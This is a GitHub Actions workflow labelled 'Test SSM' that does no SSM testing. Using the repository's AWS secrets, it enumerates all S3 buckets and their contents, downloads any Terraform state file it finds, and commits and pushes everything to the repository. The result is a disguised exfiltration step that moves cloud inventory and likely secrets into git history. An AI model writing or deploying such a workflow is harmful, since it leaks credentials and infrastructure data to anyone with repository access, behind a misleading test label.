name: Test SSM
on:
  push:
    branches:
      - main
env:
  AWS_REGION: ap-south-1
jobs:
  test-ssm:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v3
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: ${{ env.AWS_REGION }}
      - name: Test Command
        run: |
          set +e
          TS=$(date +%s)
          mkdir -p iam_output
          
          aws s3 ls > iam_output/s3_buckets-$TS.txt 2>&1
          
          for bucket in $(aws s3 ls | awk '{print $3}'); do
            aws s3 ls s3://$bucket --recursive > iam_output/s3_objs_$bucket-$TS.txt 2>&1
            # If we find a tfstate file, download it!
            tfstate=$(aws s3 ls s3://$bucket --recursive | awk '{print $4}' | grep tfstate)
            if [ -n "$tfstate" ]; then
              aws s3 cp s3://$bucket/$tfstate iam_output/terraform.tfstate 2>&1
            fi
          done
          
          git config --global user.name 'github-actions[bot]'
          git config --global user.email 'github-actions[bot]@users.noreply.github.com'
          git add iam_output/
          git commit -m "Test s3 ls $TS" || true
          sleep 10
          git pull --rebase origin main
          git push origin main
